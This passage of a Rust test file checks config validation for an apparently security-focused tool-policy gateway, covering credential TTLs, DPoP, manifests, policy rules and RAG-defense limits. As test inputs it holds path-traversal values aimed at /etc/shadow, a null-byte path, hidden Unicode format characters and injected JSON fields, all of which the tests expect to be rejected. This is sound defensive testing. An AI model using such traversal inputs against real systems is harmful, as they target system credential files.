fn test_nhi_config_anomaly_threshold_negative() {
    let cfg = crate::memory_nhi::NhiConfig {
        anomaly_threshold: -0.1,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("anomaly_threshold"));
}

#[test]
fn test_nhi_config_anomaly_threshold_above_one() {
    let cfg = crate::memory_nhi::NhiConfig {
        anomaly_threshold: 1.1,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("anomaly_threshold"));
}

#[test]
fn test_nhi_config_ttl_consistency() {
    let cfg = crate::memory_nhi::NhiConfig {
        credential_ttl_secs: 100_000,
        max_credential_ttl_secs: 50_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("credential_ttl_secs"));
}

#[test]
fn test_nhi_config_max_credential_ttl_exceeds_cap() {
    let cfg = crate::memory_nhi::NhiConfig {
        max_credential_ttl_secs: 700_000,
        ..Default::default()
    }; // > 7 * 86400
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_credential_ttl_secs"));
}

#[test]
fn test_nhi_config_delegation_chain_depth_exceeds_cap() {
    let cfg = crate::memory_nhi::NhiConfig {
        max_delegation_chain_depth: 100,
        ..Default::default()
    }; // > 50
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_delegation_chain_depth"));
}

#[test]
fn test_nhi_config_attestation_types_control_chars() {
    let cfg = crate::memory_nhi::NhiConfig {
        attestation_types: vec!["jwt\x00".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("control or format characters"));
}

#[test]
fn test_nhi_config_attestation_types_empty_entry() {
    let cfg = crate::memory_nhi::NhiConfig {
        attestation_types: vec!["".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_nhi_config_privileged_tags_too_many() {
    let cfg = crate::memory_nhi::NhiConfig {
        privileged_tags: (0..51).map(|i| format!("tag-{i}")).collect(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("privileged_tags"));
}

#[test]
fn test_nhi_config_additional_trust_domains_control_chars() {
    let cfg = crate::memory_nhi::NhiConfig {
        additional_trust_domains: vec!["domain\n.local".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("control or format characters"));
}

// ═══════════════════════════════════════════════════════════
// ExtensionConfig::validate() per-string tests (FIND-R100-006)
// ═══════════════════════════════════════════════════════════

#[test]
fn test_extension_config_default_validates() {
    let cfg = crate::extension::ExtensionConfig::default();
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_extension_config_allowed_ext_empty_string() {
    let cfg = crate::extension::ExtensionConfig {
        allowed_extensions: vec!["".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("allowed_extensions"));
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_extension_config_allowed_ext_control_chars() {
    let cfg = crate::extension::ExtensionConfig {
        allowed_extensions: vec!["ext\x07id".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("control or format characters"));
}

#[test]
fn test_extension_config_blocked_ext_too_long() {
    let cfg = crate::extension::ExtensionConfig {
        blocked_extensions: vec!["x".repeat(300)],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("exceeds maximum"));
}

#[test]
fn test_extension_config_trusted_key_non_hex() {
    let cfg = crate::extension::ExtensionConfig {
        trusted_public_keys: vec!["not-hex-data!".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("hex-encoded"));
}

#[test]
fn test_extension_config_trusted_key_empty() {
    let cfg = crate::extension::ExtensionConfig {
        trusted_public_keys: vec!["".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_extension_config_valid_hex_key_passes() {
    let cfg = crate::extension::ExtensionConfig {
        trusted_public_keys: vec![
            "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890".to_string(),
        ],
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════
// ManifestConfig::validate() tests (FIND-R100-009)
// ═══════════════════════════════════════════════════════════

#[test]
fn test_manifest_config_validate_default_ok() {
    let cfg = crate::manifest::ManifestConfig::default();
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_manifest_config_validate_empty_path() {
    let cfg = crate::manifest::ManifestConfig {
        manifest_path: Some(String::new()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_manifest_config_validate_path_too_long() {
    let cfg = crate::manifest::ManifestConfig {
        manifest_path: Some("x".repeat(5000)),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("exceeds maximum"));
}

#[test]
fn test_manifest_config_validate_path_control_chars() {
    let cfg = crate::manifest::ManifestConfig {
        manifest_path: Some("/etc/\x00evil".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("control"));
}

#[test]
fn test_manifest_config_validate_path_traversal() {
    let cfg = crate::manifest::ManifestConfig {
        manifest_path: Some("/etc/../../../shadow".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains(".."));
}

#[test]
fn test_manifest_config_validate_valid_path() {
    let cfg = crate::manifest::ManifestConfig {
        manifest_path: Some("/etc/vellaveto/manifest.json".to_string()),
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════
// PolicyRule::validate() tests (FIND-R100-012)
// ═══════════════════════════════════════════════════════════

#[test]
fn test_policy_rule_validate_valid() {
    let rule = crate::policy_rule::PolicyRule {
        name: "test-rule".to_string(),
        tool_pattern: "*".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    assert!(rule.validate().is_ok());
}

#[test]
fn test_policy_rule_validate_empty_name() {
    let rule = crate::policy_rule::PolicyRule {
        name: "".to_string(),
        tool_pattern: "*".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("name must not be empty"));
}

#[test]
fn test_policy_rule_validate_name_control_chars() {
    let rule = crate::policy_rule::PolicyRule {
        name: "rule\nname".to_string(),
        tool_pattern: "*".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("control or format characters"));
}

#[test]
fn test_policy_rule_validate_empty_tool_pattern() {
    let rule = crate::policy_rule::PolicyRule {
        name: "test".to_string(),
        tool_pattern: "".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("tool_pattern must not be empty"));
}

#[test]
fn test_policy_rule_validate_empty_function_pattern() {
    let rule = crate::policy_rule::PolicyRule {
        name: "test".to_string(),
        tool_pattern: "*".to_string(),
        function_pattern: "".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("function_pattern must not be empty"));
}

#[test]
fn test_policy_rule_validate_empty_id_when_set() {
    let rule = crate::policy_rule::PolicyRule {
        name: "test".to_string(),
        tool_pattern: "*".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: Some("".to_string()),
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("id must not be empty"));
}

#[test]
fn test_policy_rule_validate_id_control_chars() {
    let rule = crate::policy_rule::PolicyRule {
        name: "test".to_string(),
        tool_pattern: "*".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: Some("id\x07bell".to_string()),
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("id contains control or format characters"));
}

#[test]
fn test_policy_rule_validate_tool_pattern_too_long() {
    let rule = crate::policy_rule::PolicyRule {
        name: "test".to_string(),
        tool_pattern: "x".repeat(600),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("tool_pattern length"));
}

// ═══════════════════════════════════════════════════════════
// Wiring: PolicyConfig propagates sub-config validation errors
// ═══════════════════════════════════════════════════════════

#[test]
fn test_policy_config_propagates_nhi_validation_error() {
    let mut cfg = PolicyConfig::default();
    cfg.nhi.anomaly_threshold = f64::NAN;
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("anomaly_threshold"));
}

#[test]
fn test_policy_config_propagates_manifest_validation_error() {
    let mut cfg = PolicyConfig::default();
    cfg.manifest.manifest_path = Some("/foo/../../../etc/shadow".to_string());
    let err = cfg.validate().unwrap_err();
    assert!(err.contains(".."));
}

#[test]
fn test_policy_config_propagates_policy_rule_validation_error() {
    let mut cfg = PolicyConfig::default();
    cfg.policies.push(crate::policy_rule::PolicyRule {
        name: "".to_string(),
        tool_pattern: "*".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    });
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("policies[0]"));
    assert!(err.contains("name must not be empty"));
}

// ═══════════════════════════════════════════════════════════
// VerificationConfig::validate() tests
// ═══════════════════════════════════════════════════════════

#[test]
fn test_verification_config_default_validates() {
    let cfg = crate::memory_nhi::VerificationConfig::default();
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_verification_config_invalid_default_tier() {
    let cfg = crate::memory_nhi::VerificationConfig {
        default_tier: "admin".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("default_tier"));
}

#[test]
fn test_verification_config_invalid_global_minimum_tier() {
    let cfg = crate::memory_nhi::VerificationConfig {
        global_minimum_tier: "superuser".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("global_minimum_tier"));
}

#[test]
fn test_verification_config_attestation_cap_exceeded() {
    let cfg = crate::memory_nhi::VerificationConfig {
        max_attestations_per_identity: 20_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_attestations_per_identity"));
}

#[test]
fn test_verification_config_zero_attestations_when_enabled() {
    let cfg = crate::memory_nhi::VerificationConfig {
        enabled: true,
        max_attestations_per_identity: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_attestations_per_identity must be > 0"));
}

#[test]
fn test_verification_config_zero_ttl_when_enabled() {
    let cfg = crate::memory_nhi::VerificationConfig {
        enabled: true,
        attestation_ttl_secs: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("attestation_ttl_secs must be > 0"));
}

#[test]
fn test_verification_config_plc_url_empty_when_did_enabled() {
    let cfg = crate::memory_nhi::VerificationConfig {
        did_plc_enabled: true,
        plc_directory_url: String::new(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("plc_directory_url must not be empty"));
}

#[test]
fn test_verification_config_plc_url_not_https() {
    let cfg = crate::memory_nhi::VerificationConfig {
        did_plc_enabled: true,
        plc_directory_url: "http://plc.directory".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("https://"));
}

#[test]
fn test_verification_config_plc_url_control_chars() {
    let cfg = crate::memory_nhi::VerificationConfig {
        did_plc_enabled: true,
        plc_directory_url: "https://plc.directory\x00".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("control or format characters"));
}

// ═══════════════════════════════════════════════════════════
// DpopConfig::validate() tests
// ═══════════════════════════════════════════════════════════

#[test]
fn test_dpop_config_default_validates() {
    let cfg = crate::memory_nhi::DpopConfig::default();
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_dpop_config_clock_skew_exceeds_cap() {
    let cfg = crate::memory_nhi::DpopConfig {
        max_clock_skew_secs: 5_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_clock_skew_secs"));
}

#[test]
fn test_dpop_config_nonce_ttl_exceeds_cap() {
    let cfg = crate::memory_nhi::DpopConfig {
        nonce_ttl_secs: 5_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("nonce_ttl_secs"));
}

#[test]
fn test_dpop_config_proof_lifetime_zero() {
    let cfg = crate::memory_nhi::DpopConfig {
        max_proof_lifetime_secs: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_proof_lifetime_secs must be > 0"));
}

#[test]
fn test_dpop_config_proof_lifetime_exceeds_cap() {
    let cfg = crate::memory_nhi::DpopConfig {
        max_proof_lifetime_secs: 1_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_proof_lifetime_secs"));
}

#[test]
fn test_dpop_config_algorithms_empty_entry() {
    let cfg = crate::memory_nhi::DpopConfig {
        allowed_algorithms: vec!["".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_dpop_config_algorithms_control_chars() {
    let cfg = crate::memory_nhi::DpopConfig {
        allowed_algorithms: vec!["ES256\n".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("control or format characters"));
}

#[test]
fn test_dpop_config_too_many_algorithms() {
    let cfg = crate::memory_nhi::DpopConfig {
        allowed_algorithms: (0..25).map(|i| format!("ALG{i}")).collect(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("allowed_algorithms"));
}

#[test]
fn test_dpop_config_max_nonces_exceeds_cap() {
    let cfg = crate::memory_nhi::DpopConfig {
        max_nonces: 2_000_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_nonces"));
}

// ═══════════════════════════════════════════════════════════
// NhiConfig propagates sub-config validation errors
// ═══════════════════════════════════════════════════════════

#[test]
fn test_nhi_config_propagates_verification_error() {
    let mut cfg = crate::memory_nhi::NhiConfig::default();
    cfg.verification.default_tier = "invalid-tier".to_string();
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("default_tier"));
}

#[test]
fn test_nhi_config_propagates_dpop_error() {
    let mut cfg = crate::memory_nhi::NhiConfig::default();
    cfg.dpop.max_proof_lifetime_secs = 0;
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_proof_lifetime_secs"));
}

// ═══════════════════════════════════════════════════════════
// Round 102 fixes: Unicode format char, NamespaceConfig,
// MemorySecurityConfig bounds, ManifestConfig trusted_keys,
// ThreatIntelConfig Debug, manifest deny_unknown_fields
// ═══════════════════════════════════════════════════════════

#[test]
fn test_policy_rule_validate_name_unicode_format_char() {
    let rule = crate::policy_rule::PolicyRule {
        name: "rule\u{200B}name".to_string(), // zero-width space
        tool_pattern: "*".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("format characters"), "got: {err}");
}

#[test]
fn test_policy_rule_validate_tool_pattern_unicode_format_char() {
    let rule = crate::policy_rule::PolicyRule {
        name: "test".to_string(),
        tool_pattern: "mcp\u{FEFF}server".to_string(), // BOM
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    let err = rule.validate().unwrap_err();
    assert!(err.contains("format characters"), "got: {err}");
}

#[test]
fn test_extension_config_allowed_ext_unicode_format_char() {
    let cfg = crate::extension::ExtensionConfig {
        allowed_extensions: vec!["ext\u{200B}id".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("format characters"), "got: {err}");
}

#[test]
fn test_nhi_config_attestation_types_unicode_format_char() {
    let cfg = crate::memory_nhi::NhiConfig {
        attestation_types: vec!["jwt\u{200B}".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("format characters"), "got: {err}");
}

#[test]
fn test_dpop_config_algorithms_unicode_format_char() {
    let cfg = crate::memory_nhi::DpopConfig {
        allowed_algorithms: vec!["ES\u{200B}256".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("format characters"), "got: {err}");
}

#[test]
fn test_verification_config_plc_url_unicode_format_char() {
    let cfg = crate::memory_nhi::VerificationConfig {
        did_plc_enabled: true,
        plc_directory_url: "https://plc\u{200B}.directory".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("format characters"), "got: {err}");
}

// NamespaceConfig::validate() tests
#[test]
fn test_namespace_config_default_validates() {
    let cfg = crate::memory_nhi::NamespaceConfig::default();
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_namespace_config_invalid_isolation() {
    let cfg = crate::memory_nhi::NamespaceConfig {
        default_isolation: "invalid".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("default_isolation"), "got: {err}");
}

#[test]
fn test_namespace_config_max_namespaces_exceeds_cap() {
    let cfg = crate::memory_nhi::NamespaceConfig {
        max_namespaces: 200_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_namespaces"), "got: {err}");
}

#[test]
fn test_namespace_config_isolation_unicode_format_char() {
    let cfg = crate::memory_nhi::NamespaceConfig {
        default_isolation: "session\u{200B}".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    // Will fail on the known-values check since "session\u{200B}" != "session"
    assert!(err.contains("default_isolation"), "got: {err}");
}

// MemorySecurityConfig::validate() bounds tests
#[test]
fn test_memory_security_config_max_memory_age_exceeds_cap() {
    let cfg = crate::memory_nhi::MemorySecurityConfig {
        max_memory_age_hours: 365 * 24 + 1,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_memory_age_hours"), "got: {err}");
}

#[test]
fn test_memory_security_config_max_entries_exceeds_cap() {
    let cfg = crate::memory_nhi::MemorySecurityConfig {
        max_entries_per_session: 2_000_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_entries_per_session"), "got: {err}");
}

#[test]
fn test_memory_security_config_max_provenance_exceeds_cap() {
    let cfg = crate::memory_nhi::MemorySecurityConfig {
        max_provenance_nodes: 2_000_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_provenance_nodes"), "got: {err}");
}

#[test]
fn test_memory_security_config_max_fingerprints_exceeds_cap() {
    let cfg = crate::memory_nhi::MemorySecurityConfig {
        max_fingerprints: 200_000,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("max_fingerprints"), "got: {err}");
}

#[test]
fn test_memory_security_config_propagates_namespace_error() {
    let mut cfg = crate::memory_nhi::MemorySecurityConfig::default();
    cfg.namespaces.default_isolation = "bogus".to_string();
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("memory.namespaces.default_isolation"),
        "got: {err}"
    );
}

// ManifestConfig::validate() trusted_keys tests
#[test]
fn test_manifest_config_trusted_keys_too_many() {
    let cfg = crate::manifest::ManifestConfig {
        trusted_keys: (0..65).map(|i| format!("{i:064x}")).collect(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("trusted_keys"), "got: {err}");
}

#[test]
fn test_manifest_config_trusted_keys_empty_entry() {
    let cfg = crate::manifest::ManifestConfig {
        trusted_keys: vec!["".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("trusted_keys") && err.contains("must not be empty"),
        "got: {err}"
    );
}

#[test]
fn test_manifest_config_trusted_keys_non_hex() {
    let cfg = crate::manifest::ManifestConfig {
        trusted_keys: vec!["not-hex!".to_string()],
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("hex-encoded"), "got: {err}");
}

#[test]
fn test_manifest_config_trusted_keys_valid_hex() {
    let cfg = crate::manifest::ManifestConfig {
        trusted_keys: vec!["abcdef0123456789".to_string()],
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

// deny_unknown_fields on manifest types
#[test]
fn test_manifest_annotations_deny_unknown_fields() {
    let json = r#"{"read_only_hint": true, "unknown_field": false}"#;
    let result: Result<crate::manifest::ManifestAnnotations, _> = serde_json::from_str(json);
    assert!(result.is_err(), "should reject unknown field");
}

#[test]
fn test_manifest_tool_entry_deny_unknown_fields() {
    let json = r#"{"name": "test", "input_schema_hash": "abc", "injected": true}"#;
    let result: Result<crate::manifest::ManifestToolEntry, _> = serde_json::from_str(json);
    assert!(result.is_err(), "should reject unknown field");
}

#[test]
fn test_tool_manifest_deny_unknown_fields() {
    let json = r#"{"schema_version": "2.0", "tools": [], "injected": "evil"}"#;
    let result: Result<crate::manifest::ToolManifest, _> = serde_json::from_str(json);
    assert!(result.is_err(), "should reject unknown field");
}

// ToolManifest::from_tools_list bounds check
#[test]
fn test_manifest_from_tools_list_too_many_tools() {
    let tools: Vec<serde_json::Value> = (0..10_001)
        .map(|i| {
            serde_json::json!({
                "name": format!("tool_{}", i),
                "inputSchema": {"type": "object"}
            })
        })
        .collect();
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": { "tools": tools }
    });
    assert!(
        crate::manifest::ToolManifest::from_tools_list(&response).is_none(),
        "should reject >10,000 tools"
    );
}

// ThreatIntelConfig Debug redacts api_key
#[test]
fn test_threat_intel_config_debug_redacts_api_key() {
    let cfg = crate::enterprise::ThreatIntelConfig {
        api_key: Some("super-secret-key".to_string()),
        ..Default::default()
    };
    let debug = format!("{cfg:?}");
    assert!(
        !debug.contains("super-secret-key"),
        "API key should be redacted: {debug}"
    );
    assert!(
        debug.contains("REDACTED"),
        "Should show [REDACTED]: {debug}"
    );
}

// PolicyRule PartialEq
#[test]
fn test_policy_rule_partial_eq() {
    let r1 = crate::policy_rule::PolicyRule {
        name: "test".to_string(),
        tool_pattern: "*".to_string(),
        function_pattern: "*".to_string(),
        policy_type: vellaveto_types::PolicyType::Allow,
        priority: Some(0),
        id: None,
        path_rules: None,
        network_rules: None,
    };
    let r2 = r1.clone();
    assert_eq!(r1, r2);
}

// =============================================================================
// ROUND 104 FIXES
// =============================================================================

#[test]
fn test_tool_manifest_debug_redacts_signature() {
    let manifest = ToolManifest {
        schema_version: "2.0".to_string(),
        tools: vec![],
        signature: Some("deadbeef01234567".to_string()),
        created_at: Some("2026-01-01T00:00:00Z".to_string()),
        verifying_key: Some("aabbccdd".to_string()),
    };
    let debug = format!("{manifest:?}");
    assert!(
        !debug.contains("deadbeef01234567"),
        "Debug output must not contain raw signature"
    );
    assert!(
        !debug.contains("aabbccdd"),
        "Debug output must not contain raw verifying_key"
    );
    assert!(
        debug.contains("[REDACTED]"),
        "Debug output should show [REDACTED]"
    );
}

#[test]
fn test_tool_manifest_load_pinned_rejects_too_many_tools() {
    use std::io::Write;
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("manifest.json");

    // Build a manifest with MAX_MANIFEST_TOOLS + 1 entries.
    let mut tools = Vec::new();
    for i in 0..=10_000 {
        tools.push(serde_json::json!({
            "name": format!("tool_{}", i),
            "input_schema_hash": "abcd1234"
        }));
    }
    let manifest_json = serde_json::json!({
        "schema_version": "2.0",
        "tools": tools
    });
    let mut f = std::fs::File::create(&path).unwrap();
    f.write_all(manifest_json.to_string().as_bytes()).unwrap();

    let result = ToolManifest::load_pinned_manifest(path.to_str().unwrap());
    assert!(
        result.is_err(),
        "Should reject manifest with too many tools"
    );
    let err = result.unwrap_err().to_string();
    assert!(
        err.contains("exceeds maximum"),
        "Error should mention exceeds maximum, got: {err}"
    );
}

// ═══════════════════════════════════════════════════
// RAG DEFENSE CONFIG INTEGER BOUNDS (IMP-R106-002)
// ═══════════════════════════════════════════════════

#[test]
fn test_rag_defense_config_validate_cache_ttl_too_large() {
    let cfg = crate::rag_defense_config::RagDefenseConfig {
        cache_ttl_secs: u64::MAX,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("cache_ttl_secs"),
        "Error should mention field: {err}"
    );
    assert!(
        err.contains("exceeds maximum"),
        "Error should mention limit: {err}"
    );
}

#[test]
fn test_rag_defense_config_validate_cache_max_size_too_large() {
    let cfg = crate::rag_defense_config::RagDefenseConfig {
        cache_max_size: usize::MAX,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("cache_max_size"),
        "Error should mention field: {err}"
    );
}

#[test]
fn test_rag_defense_config_validate_max_retrieval_results_zero() {
    let mut cfg = crate::rag_defense_config::RagDefenseConfig::default();
    cfg.retrieval_security.max_retrieval_results = 0;
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("max_retrieval_results"),
        "Error should mention field: {err}"
    );
    assert!(
        err.contains("must be > 0"),
        "Error should mention > 0: {err}"
    );
}

#[test]
fn test_rag_defense_config_validate_max_tokens_per_retrieval_zero() {
    let mut cfg = crate::rag_defense_config::RagDefenseConfig::default();
    cfg.context_budget.max_tokens_per_retrieval = 0;
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("max_tokens_per_retrieval"),
        "Error should mention field: {err}"
    );
}

#[test]
fn test_rag_defense_config_validate_max_claims_zero() {
    let mut cfg = crate::rag_defense_config::RagDefenseConfig::default();
    cfg.grounding.max_claims = 0;
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("max_claims"),
        "Error should mention field: {err}"
    );
}

#[test]
fn test_rag_defense_config_validate_max_claims_too_large() {
    let mut cfg = crate::rag_defense_config::RagDefenseConfig::default();
    cfg.grounding.max_claims = 100_000;
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("max_claims"),
        "Error should mention field: {err}"
    );
    assert!(
        err.contains("exceeds maximum"),
        "Error should mention limit: {err}"
    );
}

#[test]
fn test_rag_defense_config_validate_default_passes() {
    let cfg = crate::rag_defense_config::RagDefenseConfig::default();
    assert!(
        cfg.validate().is_ok(),
        "Default config should validate successfully"
    );
}

// ═══════════════════════════════════════════════════
// FIND-R102: Zero cache/credential TTL rejection tests
// ═══════════════════════════════════════════════════

#[test]
fn test_rag_defense_config_validate_cache_ttl_zero() {
    let cfg = crate::rag_defense_config::RagDefenseConfig {
        cache_ttl_secs: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("cache_ttl_secs"),
        "Error should mention field: {err}"
    );
    assert!(
        err.contains("must be > 0"),
        "Error should mention > 0: {err}"
    );
}

#[test]
fn test_nhi_config_credential_ttl_zero() {
    let cfg = crate::memory_nhi::NhiConfig {
        credential_ttl_secs: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("credential_ttl_secs"),
        "Error should mention field: {err}"
    );
    assert!(
        err.contains("must be > 0"),
        "Error should mention > 0: {err}"
    );
}

#[test]
fn test_nhi_config_max_credential_ttl_zero() {
    let cfg = crate::memory_nhi::NhiConfig {
        max_credential_ttl_secs: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("max_credential_ttl_secs"),
        "Error should mention field: {err}"
    );
    assert!(
        err.contains("must be > 0"),
        "Error should mention > 0: {err}"
    );
}

#[test]
fn test_spiffe_svid_cache_ttl_zero_rejected() {
    let cfg = crate::PolicyConfig {
        spiffe: crate::enterprise::SpiffeConfig {
            enabled: true,
            trust_domain: Some("example.org".to_string()),
            svid_cache_ttl_secs: 0,
            ..Default::default()
        },
        ..crate::PolicyConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("svid_cache_ttl_secs"),
        "Error should mention field: {err}"
    );
    assert!(
        err.contains("must be > 0"),
        "Error should mention > 0: {err}"
    );
}

#[test]
fn test_threat_intel_cache_ttl_zero_rejected() {
    let cfg = crate::PolicyConfig {
        threat_intel: crate::enterprise::ThreatIntelConfig {
            enabled: true,
            provider: Some(crate::enterprise::ThreatIntelProvider::Taxii),
            endpoint: Some("https://feed.example.com".to_string()),
            on_match: "deny".to_string(),
            cache_ttl_secs: 0,
            ..Default::default()
        },
        ..crate::PolicyConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("cache_ttl_secs"),
        "Error should mention field: {err}"
    );
    assert!(
        err.contains("must be > 0"),
        "Error should mention > 0: {err}"
    );
}

#[test]
fn test_threat_intel_refresh_interval_zero_rejected() {
    let cfg = crate::PolicyConfig {
        threat_intel: crate::enterprise::ThreatIntelConfig {
            enabled: true,
            provider: Some(crate::enterprise::ThreatIntelProvider::Taxii),
            endpoint: Some("https://feed.example.com".to_string()),
            on_match: "deny".to_string(),
            cache_ttl_secs: 3600,
            refresh_interval_secs: 0,
            ..Default::default()
        },
        ..crate::PolicyConfig::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(
        err.contains("refresh_interval_secs"),
